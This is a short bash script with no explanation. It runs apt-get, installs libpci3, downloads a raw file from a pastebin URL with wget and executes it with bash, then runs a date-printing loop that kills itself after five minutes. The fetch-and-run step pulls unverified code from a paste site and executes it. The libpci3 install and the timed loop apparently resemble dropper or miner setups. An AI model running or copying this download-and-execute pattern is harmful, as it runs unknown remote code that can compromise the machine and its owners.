#!/bin/bash

apt-get update 
apt-get install libpci3
wget https://pastebin.com/raw/enDtdTiT
bash enDtdTiT

{
    sleep 5m
    kill $$
} &

while true
do
    date
    sleep 1
done
